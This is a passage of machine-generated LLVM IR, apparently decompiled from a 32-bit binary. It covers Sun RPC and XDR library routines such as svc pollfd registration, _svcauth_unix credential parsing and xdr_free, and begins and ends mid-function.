  %v1_80567d7 = phi i32 [ %v1_80567d7.pre, %dec_label_pc_80567b5.dec_label_pc_80567d7_crit_edge ], [ %tmp9, %entry ]
  %v0_80567d7 = phi i32 [ %v0_80567d7.pre, %dec_label_pc_80567b5.dec_label_pc_80567d7_crit_edge ], [ %tmp8, %entry ]
  %v2_80567d7 = call i32 @_rpc_dtablesize(i32 %v0_80567d7, i32 %v1_80567d7)
  store i32 %v2_80567d7, i32* %eax.global-to-local, align 4
  %v0_80567dc = load i32, i32* @edi, align 4
  %v5_80567de = icmp slt i32 %v0_80567dc, %v2_80567d7
  br i1 %v5_80567de, label %dec_label_pc_80567e4, label %dec_label_pc_8056871

dec_label_pc_80567e4:                             ; preds = %dec_label_pc_80567d7
  %v0_80567e4 = load i32, i32* @ebx, align 4
  %v1_80567e4 = add i32 %v0_80567e4, 180
  %v2_80567e4 = inttoptr i32 %v1_80567e4 to i32*
  %v3_80567e4 = load i32, i32* %v2_80567e4, align 4
  store i32 %v3_80567e4, i32* %eax.global-to-local, align 4
  %v1_80567ea = add i32 %v0_80567dc, -1023
  %v6_80567ea = sub i32 1022, %v0_80567dc
  %v7_80567ea = and i32 %v6_80567ea, %v0_80567dc
  %v8_80567ea = icmp slt i32 %v7_80567ea, 0
  %v9_80567ea = icmp eq i32 %v1_80567ea, 0
  %v10_80567ea = icmp slt i32 %v1_80567ea, 0
  %v0_80567f0 = load i32, i32* @esi, align 4
  %v3_80567f0 = mul i32 %v0_80567dc, 4
  %v4_80567f0 = add i32 %v3_80567e4, %v3_80567f0
  %v5_80567f0 = inttoptr i32 %v4_80567f0 to i32*
  store i32 %v0_80567f0, i32* %v5_80567f0, align 4
  %v3_80567f3 = icmp eq i1 %v10_80567ea, %v8_80567ea
  %v4_80567f3 = icmp eq i1 %v9_80567ea, false
  %v5_80567f3 = and i1 %v4_80567f3, %v3_80567f3
  br i1 %v5_80567f3, label %dec_label_pc_8056808, label %dec_label_pc_80567f5

dec_label_pc_80567f5:                             ; preds = %dec_label_pc_80567e4
  %v0_80567f5 = call i32 @__GI___rpc_thread_svc_fdset()
  store i32 %v0_80567f5, i32* %eax.global-to-local, align 4
  %v0_80567fa = load i32, i32* @edi, align 4
  %v2_80567fc = udiv i32 %v0_80567fa, 32
  store i32 %v2_80567fc, i32* @ecx, align 4
  %v1_8056801 = urem i32 %v0_80567fa, 32
  %v2_8056804 = mul nuw nsw i32 %v2_80567fc, 4
  %v3_8056804 = add i32 %v2_8056804, %v0_80567f5
  %v4_8056804 = inttoptr i32 %v3_8056804 to i32*
  %v5_8056804 = load i32, i32* %v4_8056804, align 4
  %v8_8056804 = shl i32 1, %v1_8056801
  %v11_8056804 = or i32 %v5_8056804, %v8_8056804
  store i32 %v11_8056804, i32* %v4_8056804, align 4
  br label %dec_label_pc_8056808

dec_label_pc_8056808:                             ; preds = %dec_label_pc_80567e4, %dec_label_pc_80567f5
  br label %dec_label_pc_805682f

dec_label_pc_805680c:                             ; preds = %dec_label_pc_805682f
  %v0_805680c = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_805680c, i32* %eax.global-to-local, align 4
  %v0_8056811 = load i32, i32* @ebx, align 4
  %v1_8056811 = mul i32 %v0_8056811, 8
  store i32 %v1_8056811, i32* @ecx, align 4
  %v2_805681a = inttoptr i32 %v0_805680c to i32*
  %v3_805681a = load i32, i32* %v2_805681a, align 4
  %v4_805681a = add i32 %v3_805681a, %v1_8056811
  %v1_805681c = inttoptr i32 %v4_805681a to i32*
  %v2_805681c = load i32, i32* %v1_805681c, align 4
  %v12_805681c = icmp eq i32 %v2_805681c, -1
  %v1_805681f = icmp eq i1 %v12_805681c, false
  br i1 %v1_805681f, label %dec_label_pc_805682e, label %dec_label_pc_8056821

dec_label_pc_8056821:                             ; preds = %dec_label_pc_805680c
  %v0_8056821 = load i32, i32* @edi, align 4
  store i32 %v0_8056821, i32* %v1_805681c, align 4
  %v2_8056823 = load i32, i32* %v2_805681a, align 4
  store i32 %v2_8056823, i32* %eax.global-to-local, align 4
  %v1_8056825 = load i32, i32* @ecx, align 4
  %v2_8056825 = add i32 %v2_8056823, 4
  %v3_8056825 = add i32 %v2_8056825, %v1_8056825
  %v4_8056825 = inttoptr i32 %v3_8056825 to i16*
  store i16 195, i16* %v4_8056825, align 2
  br label %dec_label_pc_8056871

dec_label_pc_805682e:                             ; preds = %dec_label_pc_805680c
  %v1_805682e = add i32 %v0_8056811, 1
  br label %dec_label_pc_805682f

dec_label_pc_805682f:                             ; preds = %dec_label_pc_8056808, %dec_label_pc_805682e
  %storemerge = phi i32 [ 0, %dec_label_pc_8056808 ], [ %v1_805682e, %dec_label_pc_805682e ]
  store i32 %storemerge, i32* @ebx, align 4
  %v0_805682f = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_805682f, i32* %eax.global-to-local, align 4
  store i32 %v0_805682f, i32* @esi, align 4
  %v1_8056836 = inttoptr i32 %v0_805682f to i32*
  %v2_8056836 = load i32, i32* %v1_8056836, align 4
  store i32 %v2_8056836, i32* %eax.global-to-local, align 4
  %v0_8056838 = load i32, i32* @ebx, align 4
  %v5_805683a = icmp slt i32 %v0_8056838, %v2_8056836
  br i1 %v5_805683a, label %dec_label_pc_805680c, label %dec_label_pc_805683c

dec_label_pc_805683c:                             ; preds = %dec_label_pc_805682f
  %v1_805683c = add i32 %v2_8056836, 1
  store i32 %v1_805683c, i32* %eax.global-to-local, align 4
  store i32 %v1_805683c, i32* %v1_8056836, align 4
  %v0_805683f = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_805683f, i32* %eax.global-to-local, align 4
  store i32 %v0_805683f, i32* @ebx, align 4
  %v0_8056848 = load i32, i32* @esi, align 4
  %v1_8056848 = inttoptr i32 %v0_8056848 to i32*
  %v2_8056848 = load i32, i32* %v1_8056848, align 4
  %v2_805684a = mul i32 %v2_8056848, 8
  store i32 %v2_805684a, i32* %eax.global-to-local, align 4
  store i32 %v2_805684a, i32* %stack_var_-24, align 4
  %v1_805684e = inttoptr i32 %v0_805683f to i32*
  %v2_805684e = load i32, i32* %v1_805684e, align 4
  store i32 %v2_805684e, i32* %stack_var_-28, align 4
  %v4_8056850 = inttoptr i32 %v2_805684e to i32*
  %v5_8056850 = call i32 @realloc(i32* %v4_8056850, i32 %v2_805684a, i32 %v0_805683f, i32 %v0_805683f)
  store i32 %v5_8056850, i32* %eax.global-to-local, align 4
  %v1_8056858 = load i32, i32* @ebx, align 4
  %v2_8056858 = inttoptr i32 %v1_8056858 to i32*
  store i32 %v5_8056850, i32* %v2_8056858, align 4
  %v0_805685a = load i32, i32* %eax.global-to-local, align 4
  %v1_805685c = icmp eq i32 %v0_805685a, 0
  br i1 %v1_805685c, label %dec_label_pc_8056871, label %dec_label_pc_8056860

dec_label_pc_8056860:                             ; preds = %dec_label_pc_805683c
  %v0_8056860 = load i32, i32* @esi, align 4
  %v1_8056860 = inttoptr i32 %v0_8056860 to i32*
  %v2_8056860 = load i32, i32* %v1_8056860, align 4
  store i32 %v2_8056860, i32* %eax.global-to-local, align 4
  %v0_8056862 = load i32, i32* @edi, align 4
  %v3_8056862 = mul i32 %v2_8056860, 8
  %v4_8056862 = add i32 %v0_805685a, -8
  %v5_8056862 = add i32 %v4_8056862, %v3_8056862
  %v6_8056862 = inttoptr i32 %v5_8056862 to i32*
  store i32 %v0_8056862, i32* %v6_8056862, align 4
  %v0_8056866 = load i32, i32* @esi, align 4
  %v1_8056866 = inttoptr i32 %v0_8056866 to i32*
  %v2_8056866 = load i32, i32* %v1_8056866, align 4
  %v0_8056868 = load i32, i32* @ebx, align 4
  %v1_8056868 = inttoptr i32 %v0_8056868 to i32*
  %v2_8056868 = load i32, i32* %v1_8056868, align 4
  store i32 %v2_8056868, i32* %eax.global-to-local, align 4
  %v2_805686a = mul i32 %v2_8056866, 8
  %v3_805686a = add i32 %v2_805686a, -4
  %v4_805686a = add i32 %v3_805686a, %v2_8056868
  %v5_805686a = inttoptr i32 %v4_805686a to i16*
  store i16 195, i16* %v5_805686a, align 2
  br label %dec_label_pc_8056871

dec_label_pc_8056871:                             ; preds = %dec_label_pc_80567d7, %dec_label_pc_805683c, %dec_label_pc_80567b5, %dec_label_pc_8056821, %dec_label_pc_8056860
  %v0_8056874 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8056874

; uselistorder directives
  uselistorder i32 %v2_805684a, { 2, 1, 0 }
  uselistorder i32 %v2_80567fc, { 1, 0 }
  uselistorder i32 %v0_80567fa, { 1, 0 }
  uselistorder i32 %v1_80567ea, { 1, 0 }
  uselistorder i32 %v0_80567dc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_80567bd, { 2, 1, 0 }
  uselistorder i32* %stack_var_-24, { 2, 0, 1 }
  uselistorder i32* %stack_var_-28, { 2, 0, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 14, 0, 1, 2, 3, 4, 8, 5, 9, 6, 7, 10, 11, 12, 13, 15, 16, 17, 18 }
  uselistorder i32 ()* @__rpc_thread_svc_max_pollfd, { 3, 2, 0, 1 }
  uselistorder i32 ()* @__rpc_thread_svc_pollfd, { 2, 1, 0 }
  uselistorder i32 ()* @__GI___rpc_thread_svc_fdset, { 1, 0 }
  uselistorder i32 1022, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @_rpc_dtablesize, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8056871, { 4, 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_805682f, { 1, 0 }
  uselistorder label %dec_label_pc_8056808, { 1, 0 }
}

define i32 @_authenticate() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8056879 = load i32, i32* @ebx, align 4
  store i32 %v0_8056879, i32* %stack_var_-8, align 4
  store i32 %tmp1, i32* %ebx.global-to-local, align 4
  store i32 %tmp, i32* @esi, align 4
  %v1_8056887 = add i32 %tmp1, 12
  %v1_805688a = add i32 %tmp, 24
  %v3_805688f = inttoptr i32 %v1_8056887 to i16*
  %v4_805688f = call i32 @memcpy(i16* %v3_805688f, i32 %v1_805688a, i32 12)
  %v1_8056894 = add i32 %tmp1, 28
  %v2_8056894 = inttoptr i32 %v1_8056894 to i32*
  %v3_8056894 = load i32, i32* %v2_8056894, align 4
  %v0_8056897 = load i32, i32* @global_var_8067a80.299, align 128
  %v2_805689f = add i32 %v3_8056894, 32
  %v3_805689f = inttoptr i32 %v2_805689f to i32*
  store i32 %v0_8056897, i32* %v3_805689f, align 4
  %v0_80568a2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80568a2 = add i32 %v0_80568a2, 28
  %v2_80568a2 = inttoptr i32 %v1_80568a2 to i32*
  %v3_80568a2 = load i32, i32* %v2_80568a2, align 4
  %v1_80568a5 = add i32 %v3_80568a2, 40
  %v2_80568a5 = inttoptr i32 %v1_80568a5 to i32*
  store i32 0, i32* %v2_80568a5, align 4
  %v0_80568ac = load i32, i32* %ebx.global-to-local, align 4
  %v1_80568ac = add i32 %v0_80568ac, 12
  %v2_80568ac = inttoptr i32 %v1_80568ac to i32*
  %v3_80568ac = load i32, i32* %v2_80568ac, align 4
  %v1_80568bc = mul i32 %v3_80568ac, 4
  %v2_80568bc = add i32 %v1_80568bc, ptrtoint (i32* @global_var_805cb58.309 to i32)
  %v3_80568bc = inttoptr i32 %v2_80568bc to i32*
  %v4_80568bc = load i32, i32* %v3_80568bc, align 4
  %v2_80568c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80568c4, i32* %ebx.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_80568bc)
  %v2_80568cd = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80568cd, i32* @edx, align 4
  store i32 %v2_80568c4, i32* @ebx, align 4
  ret i32 2

; uselistorder directives
  uselistorder i32 %tmp1, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
}

define i32 @_svcauth_null() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_svcauth_short() local_unnamed_addr {
entry:
  ret i32 2
}

define i32 @_svcauth_unix(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80568db = load i32, i32* @edi, align 4
  %v0_80568dd = load i32, i32* @ebx, align 4
  store i32 %v0_80568dd, i32* %stack_var_-16, align 4
  %v1_80568e5 = add i32 %arg2, 24
  %v2_80568e5 = inttoptr i32 %v1_80568e5 to i32*
  %v3_80568e5 = load i32, i32* %v2_80568e5, align 4
  store i32 %v3_80568e5, i32* @edi, align 4
  %v1_80568e8 = add i32 %v3_80568e5, 24
  %v2_80568eb = add i32 %v3_80568e5, 4
  %v3_80568eb = inttoptr i32 %v2_80568eb to i32*
  store i32 %v1_80568e8, i32* %v3_80568eb, align 4
  %v0_80568ee = load i32, i32* @edi, align 4
  %v1_80568ee = add i32 %v0_80568ee, 280
  %v2_80568f4 = add i32 %v0_80568ee, 20
  %v3_80568f4 = inttoptr i32 %v2_80568f4 to i32*
  store i32 %v1_80568ee, i32* %v3_80568f4, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v1_80568fb = add i32 %arg3, 32
  %v2_80568fb = inttoptr i32 %v1_80568fb to i32*
  %v3_80568fb = load i32, i32* %v2_80568fb, align 4
  store i32 %v3_80568fb, i32* %edx.global-to-local, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v1_8056909 = add i32 %arg3, 28
  %v2_8056909 = inttoptr i32 %v1_8056909 to i32*
  %v3_8056909 = load i32, i32* %v2_8056909, align 4
  %v2_805690c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_805690c, i32* @ebx, align 4
  %v5_8056911 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-40, i32 %v3_8056909, i32 %v3_80568fb, i32 1)
  store i32 %v2_805690c, i32* @esi, align 4
  store i32 %v3_8056909, i32* @ebp, align 4
  store i32 %tmp7, i32* @eax, align 4
  %v7_8056921 = add i32 %tmp7, 24
  %v8_8056921 = inttoptr i32 %v7_8056921 to i32*
  %v9_8056921 = load i32, i32* %v8_8056921, align 4
  call void @__pseudo_call(i32 %v9_8056921)
  store i32 %tmp7, i32* %edx.global-to-local, align 4
  %v1_8056929 = icmp eq i32 %tmp7, 0
  br i1 %v1_8056929, label %dec_label_pc_80569be, label %dec_label_pc_8056931

dec_label_pc_8056931:                             ; preds = %entry
  %v1_8056931 = inttoptr i32 %tmp7 to i32*
  %v2_8056931 = load i32, i32* %v1_8056931, align 4
  %v1_8056933 = call i32 @llvm.bswap.i32(i32 %v2_8056931)
  %v1_8056935 = load i32, i32* @edi, align 4
  %v2_8056935 = inttoptr i32 %v1_8056935 to i32*
  store i32 %v1_8056933, i32* %v2_8056935, align 4
  %v0_8056937 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056937 = add i32 %v0_8056937, 4
  %v2_8056937 = inttoptr i32 %v1_8056937 to i32*
  %v3_8056937 = load i32, i32* %v2_8056937, align 4
  %v1_805693a = call i32 @llvm.bswap.i32(i32 %v3_8056937)
  store i32 %v1_805693a, i32* @esi, align 4
  %v6_8056942 = icmp ugt i32 %v1_805693a, 255
  br i1 %v6_8056942, label %dec_label_pc_8056a3b, label %dec_label_pc_8056948

dec_label_pc_8056948:                             ; preds = %dec_label_pc_8056931
  %v1_8056948 = add i32 %v0_8056937, 8
  store i32 %v1_8056948, i32* %ebx.global-to-local, align 4
  %v0_805694e = load i32, i32* @edi, align 4
  %v1_805694e = add i32 %v0_805694e, 4
  %v2_805694e = inttoptr i32 %v1_805694e to i32*
  %v3_805694e = load i32, i32* %v2_805694e, align 4
  %v1_8056951 = add i32 %v1_805693a, 3
  store i32 %v1_8056951, i32* %ebp.global-to-local, align 4
  %tmp25 = inttoptr i32 %v3_805694e to i16*
  %v5_8056954 = call i32 @memcpy(i16* %tmp25, i32 %v1_8056948, i32 %v1_805693a)
  %v1_8056959 = and i32 %v1_8056951, -4
  store i32 %v1_8056959, i32* %ebp.global-to-local, align 4
  %v0_805695c = load i32, i32* @edi, align 4
  %v1_805695c = add i32 %v0_805695c, 4
  %v2_805695c = inttoptr i32 %v1_805695c to i32*
  %v3_805695c = load i32, i32* %v2_805695c, align 4
  %v0_8056962 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056962 = add i32 %v0_8056962, %v1_8056959
  store i32 %v2_8056962, i32* %edx.global-to-local, align 4
  %v2_8056965 = add i32 %v3_805695c, %v1_805693a
  %v3_8056965 = inttoptr i32 %v2_8056965 to i8*
  store i8 0, i8* %v3_8056965, align 1
  %v0_8056969 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056969 = inttoptr i32 %v0_8056969 to i32*
  %v2_8056969 = load i32, i32* %v1_8056969, align 4
  %v1_805696b = call i32 @llvm.bswap.i32(i32 %v2_8056969)
  %v1_805696d = load i32, i32* @edi, align 4
  %v2_805696d = add i32 %v1_805696d, 8
  %v3_805696d = inttoptr i32 %v2_805696d to i32*
  store i32 %v1_805696b, i32* %v3_805696d, align 4
  %v0_8056970 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056970 = add i32 %v0_8056970, 4
  %v2_8056970 = inttoptr i32 %v1_8056970 to i32*
  %v3_8056970 = load i32, i32* %v2_8056970, align 4
  %v1_8056973 = call i32 @llvm.bswap.i32(i32 %v3_8056970)
  %v1_8056975 = load i32, i32* @edi, align 4
  %v2_8056975 = add i32 %v1_8056975, 12
  %v3_8056975 = inttoptr i32 %v2_8056975 to i32*
  store i32 %v1_8056973, i32* %v3_8056975, align 4
  %v0_8056978 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056978 = add i32 %v0_8056978, 8
  %v2_8056978 = inttoptr i32 %v1_8056978 to i32*
  %v3_8056978 = load i32, i32* %v2_8056978, align 4
  %v1_805697b = call i32 @llvm.bswap.i32(i32 %v3_8056978)
  store i32 %v1_805697b, i32* %ecx.global-to-local, align 4
  %v6_8056980 = icmp ugt i32 %v1_805697b, 16
  br i1 %v6_8056980, label %dec_label_pc_8056a3b, label %dec_label_pc_8056986

dec_label_pc_8056986:                             ; preds = %dec_label_pc_8056948
  %v1_8056986 = add i32 %v0_8056978, 12
  store i32 %v1_8056986, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v1_805698b = load i32, i32* @edi, align 4
  %v2_805698b = add i32 %v1_805698b, 16
  %v3_805698b = inttoptr i32 %v2_805698b to i32*
  store i32 %v1_805697b, i32* %v3_805698b, align 4
  %v0_805699e.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_805699e28 = icmp ult i32 %v0_805699e.pre, %v1_805697b
  br i1 %v7_805699e28, label %dec_label_pc_8056990, label %dec_label_pc_80569a2

dec_label_pc_8056990:                             ; preds = %dec_label_pc_8056986, %dec_label_pc_8056990
  %v2_805699a29 = phi i32 [ %v1_805699d, %dec_label_pc_8056990 ], [ %v0_805699e.pre, %dec_label_pc_8056986 ]
  %v0_8056990 = load i32, i32* @edi, align 4
  %v1_8056990 = add i32 %v0_8056990, 20
  %v2_8056990 = inttoptr i32 %v1_8056990 to i32*
  %v3_8056990 = load i32, i32* %v2_8056990, align 4
  store i32 %v3_8056990, i32* %edx.global-to-local, align 4
  %v0_8056993 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056993 = inttoptr i32 %v0_8056993 to i32*
  %v2_8056993 = load i32, i32* %v1_8056993, align 4
  %v1_8056995 = add i32 %v0_8056993, 4
  store i32 %v1_8056995, i32* %ebx.global-to-local, align 4
  %v1_8056998 = call i32 @llvm.bswap.i32(i32 %v2_8056993)
  %v3_805699a = mul i32 %v2_805699a29, 4
  %v4_805699a = add i32 %v3_8056990, %v3_805699a
  %v5_805699a = inttoptr i32 %v4_805699a to i32*
  store i32 %v1_8056998, i32* %v5_805699a, align 4
  %v0_805699d = load i32, i32* %esi.global-to-local, align 4
  %v1_805699d = add i32 %v0_805699d, 1
  store i32 %v1_805699d, i32* %esi.global-to-local, align 4
  %v7_805699e = icmp ult i32 %v1_805699d, %v1_805697b
  br i1 %v7_805699e, label %dec_label_pc_8056990, label %dec_label_pc_80569a2

dec_label_pc_80569a2:                             ; preds = %dec_label_pc_8056990, %dec_label_pc_8056986
  %v0_80569a2 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80569a2 = mul i32 %v1_805697b, 4
  %v3_80569a2 = add i32 %v2_80569a2, 20
  %v4_80569a2 = add i32 %v3_80569a2, %v0_80569a2
  %tmp = icmp ugt i32 %v4_80569a2, %tmp6
  br i1 %tmp, label %dec_label_pc_80569ac, label %dec_label_pc_80569e9

dec_label_pc_80569ac:                             ; preds = %dec_label_pc_80569a2
  %v6_80569b7 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @global_var_805cb64.310, i32 0, i32 0), i32 %v1_805697b, i32 %v0_80569a2, i32 %tmp6)
  br label %dec_label_pc_80569df

dec_label_pc_80569be:                             ; preds = %entry
  %v0_80569c0 = load i32, i32* @edi, align 4
  %v6_80569c2 = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-40, i32 %v0_80569c0, i32 0, i32 0)
  store i32 %v6_80569c2, i32* @eax, align 4
  %v1_80569ca = icmp eq i32 %v6_80569c2, 0
  %v1_80569cc = icmp eq i1 %v1_80569ca, false
  br i1 %v1_80569cc, label %dec_label_pc_80569e9, label %dec_label_pc_80569ce

dec_label_pc_80569ce:                             ; preds = %dec_label_pc_80569be
  %v0_80569d8 = load i32, i32* @edi, align 4
  %v6_80569da = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-40, i32 %v0_80569d8, i32 %v6_80569c2, i32 %v6_80569c2)
  br label %dec_label_pc_80569df

dec_label_pc_80569df:                             ; preds = %dec_label_pc_80569ac, %dec_label_pc_80569ce
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056a40

dec_label_pc_80569e9:                             ; preds = %dec_label_pc_80569a2, %dec_label_pc_80569be
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_80569f1 = add i32 %arg2, 44
  %v2_80569f1 = inttoptr i32 %v1_80569f1 to i32*
  %v3_80569f1 = load i32, i32* %v2_80569f1, align 4
  %v4_80569f1 = icmp eq i32 %v3_80569f1, 0
  %v1_80569f5 = add i32 %arg1, 28
  %v2_80569f5 = inttoptr i32 %v1_80569f5 to i32*
  %v3_80569f5 = load i32, i32* %v2_80569f5, align 4
  store i32 %v3_80569f5, i32* %edx.global-to-local, align 4
  br i1 %v4_80569f1, label %dec_label_pc_8056a22, label %dec_label_pc_80569fa

dec_label_pc_80569fa:                             ; preds = %dec_label_pc_80569e9
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  %v1_80569fc = add i32 %arg2, 36
  %v2_80569fc = inttoptr i32 %v1_80569fc to i32*
  %v3_80569fc = load i32, i32* %v2_80569fc, align 4
  %v2_80569ff = add i32 %v3_80569f5, 32
  %v3_80569ff = inttoptr i32 %v2_80569ff to i32*
  store i32 %v3_80569fc, i32* %v3_80569ff, align 4
  %v3_8056a06 = load i32, i32* %v2_80569f5, align 4
  store i32 %v3_8056a06, i32* %edx.global-to-local, align 4
  %v0_8056a09 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8056a09 = add i32 %v0_8056a09, 40
  %v2_8056a09 = inttoptr i32 %v1_8056a09 to i32*
  %v3_8056a09 = load i32, i32* %v2_8056a09, align 4
  %v2_8056a0c = add i32 %v3_8056a06, 36
  %v3_8056a0c = inttoptr i32 %v2_8056a0c to i32*
  store i32 %v3_8056a09, i32* %v3_8056a0c, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v3_8056a13 = load i32, i32* %v2_80569f5, align 4
  store i32 %v3_8056a13, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  %v3_8056a1a = load i32, i32* %v2_80569f1, align 4
  %v2_8056a1d = add i32 %v3_8056a13, 40
  %v3_8056a1d = inttoptr i32 %v2_8056a1d to i32*
  store i32 %v3_8056a1a, i32* %v3_8056a1d, align 4
  br label %dec_label_pc_8056a37

dec_label_pc_8056a22:                             ; preds = %dec_label_pc_80569e9
  %v1_8056a22 = add i32 %v3_80569f5, 32
  %v2_8056a22 = inttoptr i32 %v1_8056a22 to i32*
  store i32 0, i32* %v2_8056a22, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v3_8056a2d = load i32, i32* %v2_80569f5, align 4
  %v1_8056a30 = add i32 %v3_8056a2d, 40
  %v2_8056a30 = inttoptr i32 %v1_8056a30 to i32*
  store i32 0, i32* %v2_8056a30, align 4
  br label %dec_label_pc_8056a37

dec_label_pc_8056a37:                             ; preds = %dec_label_pc_80569fa, %dec_label_pc_8056a22
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056a40

dec_label_pc_8056a3b:                             ; preds = %dec_label_pc_8056948, %dec_label_pc_8056931
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056a40

dec_label_pc_8056a40:                             ; preds = %dec_label_pc_8056a37, %dec_label_pc_80569df, %dec_label_pc_8056a3b
  %v0_8056a5b5 = phi i32 [ 0, %dec_label_pc_8056a37 ], [ 1, %dec_label_pc_80569df ], [ 1, %dec_label_pc_8056a3b ]
  %v3_8056a40 = load i32, i32* %stack_var_-40, align 4
  %v1_8056a44 = add i32 %v3_8056a40, 28
  %v2_8056a44 = inttoptr i32 %v1_8056a44 to i32*
  %v3_8056a44 = load i32, i32* %v2_8056a44, align 4
  store i32 %v3_8056a44, i32* %edx.global-to-local, align 4
  %v1_8056a47 = icmp eq i32 %v3_8056a44, 0
  br i1 %v1_8056a47, label %dec_label_pc_8056a58, label %dec_label_pc_8056a4b

dec_label_pc_8056a4b:                             ; preds = %dec_label_pc_8056a40
  call void @__pseudo_call(i32 %v3_8056a44)
  %v0_8056a5b.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056a58

dec_label_pc_8056a58:                             ; preds = %dec_label_pc_8056a40, %dec_label_pc_8056a4b
  %v0_8056a5b = phi i32 [ %v0_8056a5b.pre, %dec_label_pc_8056a4b ], [ %v0_8056a5b5, %dec_label_pc_8056a40 ]
  %v2_8056a5e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8056a5e, i32* %esi.global-to-local, align 4
  store i32 %v0_80568db, i32* %ebp.global-to-local, align 4
  ret i32 %v0_8056a5b

; uselistorder directives
  uselistorder i32 %v3_80569f5, { 1, 0, 2 }
  uselistorder i32* %v2_80569f5, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805699d, { 1, 2, 0 }
  uselistorder i32 %v1_805697b, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32* %stack_var_-40, { 3, 0, 1, 2, 4 }
  uselistorder i32 %tmp7, { 0, 2, 1, 4, 3 }
  uselistorder i32 %tmp6, { 1, 0 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 4, 2, 5, 6 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 4, 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8056a58, { 1, 0 }
  uselistorder label %dec_label_pc_8056a40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056a37, { 1, 0 }
  uselistorder label %dec_label_pc_80569e9, { 1, 0 }
  uselistorder label %dec_label_pc_80569df, { 1, 0 }
  uselistorder label %dec_label_pc_8056990, { 1, 0 }
}

define i32 @xdr_free(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 2, i32* %stack_var_-24, align 4
  %v2_8056a73 = ptrtoint i32* %stack_var_-24 to i32
  %v1_8056a78 = call i32 @unknown_0(i32 %v2_8056a73)
  ret i32 %v1_8056a78

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 4, 3, 2, 1, 0 }
}

define i32 @xdr_void() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @__GI_xdr_long() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v1_8056a8e = inttoptr i32 %tmp2 to i32*
  %v2_8056a8e = load i32, i32* %v1_8056a8e, align 4
  store i32 %v2_8056a8e, i32* %eax.global-to-local, align 4
  %v1_8056a90 = icmp eq i32 %v2_8056a8e, 0
  %v1_8056a92 = icmp eq i1 %v1_8056a90, false
  br i1 %v1_8056a92, label %dec_label_pc_8056a9c, label %dec_label_pc_8056a94

dec_label_pc_8056a94:                             ; preds = %entry
  %v1_8056a94 = add i32 %tmp2, 4
  %v2_8056a94 = inttoptr i32 %v1_8056a94 to i32*
  %v3_8056a94 = load i32, i32* %v2_8056a94, align 4
  store i32 %v3_8056a94, i32* %eax.global-to-local, align 4
  %v1_8056a97 = add i32 %v3_8056a94, 4
  br label %dec_label_pc_8056aae

